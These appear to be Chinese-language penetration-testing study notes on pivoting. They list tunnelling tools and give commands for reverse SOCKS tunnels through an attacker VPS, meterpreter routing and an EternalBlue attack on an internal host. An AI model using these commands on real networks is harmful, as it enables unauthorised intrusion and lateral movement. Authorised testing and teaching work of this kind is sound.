# 跳板和端口转发

## 常用软件
1. Earthworm     工具网址：http://rootkiter.com/EarthWorm 

EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。

2.reGeorg         工具网址：https://github.com/lotus-wu/reGeorg

reGeorg是reDuh的升级版，主要是把内网服务器的端口通过http/https隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php或jsp这些web程序中的一种。

3.sSocks          工具网址：http://sourceforge.net/projects/ssocks/ 

sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.14。

4.SocksCap64     工具网址：https://sourceforge.net/projects/sockscap64/files/

SocksCap64是一款在windows下相当好使的全局代理软件。SocksCap64可以使Windows应用程序通过SOCKS代理服务器来访问网络而不需要对这些应用程序做任何修改, 即使某些本身不支持SOCKS代理的应用程序通过SocksCap64之后都可以完美的实现代理访问。

5.proxychains     工具网址：http://proxychains.sourceforge.net/ 

Proxychains是一款在LINUX下可以实现全局代理的软件，性能相当稳定可靠。在使任何程序通過代理上網，允許TCP和DNS通過代理隧道，支持HTTP、SOCKS4、SOCKS5類型的代理服務器，支持proxy chain，即可配置多個代理，同一個proxy chain可使用不同類型的代理服務器。

6. portroute https://github.com/lotus-wu/portroute

7. NATBypass https://github.com/lotus-wu/NATBypass 
仿lcx的工具

## 根据场景

### 场景1
mypc[能连myVPS]<---->myVPS[公网IP]<--->destination[能连接myVPS]
* 场景1目的：要求目标机reverse_tcp连接到mypc上7777端口

------

* 用protroute
* myVPS : ./center  建立中央服务器
* mypc : ./forward -center=vps-ip:3600 -tunnel=123456
* myVPS : ./proxy -center=127.0.0.1:3600 -tunnel=123456 并设置监听和转接信息
* destination 连接 myVPS proxy开放的端口

-----
* 推荐：
* 用NATBypass (仿lcx)
* myVPS: ./NATBypass -listen 3344 4444
* mypc: ./NATBypass -slave vps-ip:3344 127.0.0.1:7777   #外面来的数据会转发到本地7777端口
* destination 连接 myVPS 4444端口

### 场景2
mypc[能连myVPS]<---->myVPS[公网IP]<--->destination[能连接myVPS]
* 连接目标3389端口

----
* 用NATBypass (仿lcx)
* myVPS: ./NATBypass -listen 3344 4444
* destination ./NATBypass -slave vps-ip:3344 127.0.0.1:3389
* mypc 连接 myVPS的4444端口就能访问对方的3389


----

## 使用meterpreter路由

使用route命令可以借助meterpreter会话进一步msf渗透内网，我们已经拿下并产生meterpreter反弹会话的主机可能出于内网之中，外有一层NAT，我们无法直接向其内网中其他主机发起攻击，则可以借助已产生的meterpreter会话作为路由跳板，攻击内网其它主机。

```
//可以先使用run  get_local_subnets命令查看已拿下的目标主机的内网IP段情况
meterpreter > run get_local_subnets
Local subnet: 10.10.10.0/255.255.255.0
Local subnet: 192.168.10.0/255.255.255.0

meterpreter>background

//下面做一条路由，下一跳为当前拿下主机的session id（目前为1），即所有对10网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递。
msf>route add 10.10.10.0 255.255.255.0 1

//再使用route print查看一下路由表
msf exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
```
最后我们就可以通过这条路由，以当前拿下的主机meterpreter作为路由跳板攻击10网段中另一台有ms17_010漏洞的主机，获得反弹会话成功顺利拿下了另一台内网主机10.10.10.132
```
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.132
RHOST => 10.10.10.132
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.10.131
LHOST => 192.168.10.131
msf exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

## 使用meterpreter路由方法2
确定目标机器有多个网卡后，快速添加路由
```
meterpreter > run autoroute -s 7.7.7.0/24
meterpreter > run autoroute -p
meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
```
通过中转跳板进行Nmap扫描 [实验失败，原因待查][先用db_nmap 会走路由]
对此必须在Metasploit中激活路由配置，并且该配置必须能够通过socks4代理进行转发。这里有一个metasploit模块刚好满足以上需求。
使用metasploit的socks4代理模块： 
```
meterpreter > background
msf > use auxiliary/server/socks4a
msf auxiliary(socks4a) > set srvhost 172.16.0.20  //这个设置哪个IP？本机似乎没有代理成功
msf auxiliary(socks4a) > run
```
这样就在本地起了socks4代理，然后用proxychains工具代理nmap 扫描

## 使用ew

### 目标有公网IP [正向socks v5服务器]
* 目标： ew -s ssocksd -l 888
* 渗透者：使用socks客户端通过该IP代理

### 目标无公网IP，可以访问内网资源 [反弹socks v5服务器]
mypc<---->my公网VPS<---->目标

* 公网VPS：ew -s rcsocks -l 1080 -e 888
* 目标：ew  -s rssocks -d 公网VPS-IP -e 888
* 渗透者：连接VPS 1080
* 公网VPS 提示“rssocks cmd_socket OK!”表示建立了连接

* ----linux
* 渗透者: vi /etc/proxychains.conf 
* 在最后一行[ProxyList]后添加"socks5 127.0.0.1 1080"
* proxychains xxxx

* ----windows
* 渗透者：SocksCap64.exe
### 二级网络环境（一）
mypc<--firewall-->A server[公网IP，内网IP]<---->B Server[内网IP]

* B Server: ew -s ssocksd -l 888
* A Server: ew -s lcx_tran -l 1080 -f B-Server-Ip -g 888
该命令意思是将1080端口收到的代理请求转交给B Server的888端口。
* mypc 可以访问A Server的公网IP的1080口来使用B Server上架设的socks5代理

### 二级网络环境（二）
mypc<--->my公网VPS<--firewall-->A Server[内网IP]<---->B Server[内网IP，不能访问外网]

* 公网VPS： ew -s lcx_listen -l 10800 -e 888
该命令意思是在公网VPS添加转接隧道，将10800端口收到的代理请求转交给888端口。
* B Server: ew -s ssocksd -l 999
* A Server: ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999
该命令意思是在A主机上利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来。
*现在就可以通过访问公网VPS地址:10800来使用在B主机架设的socks5代理。

## 使用Termite

* 根据官网的视频介绍，功能很强大，但是实验中发现，出错时不会报任何错误信息、而且功能不稳定。
* 可以参考他的思路，用GO语言写一个工具 TODO
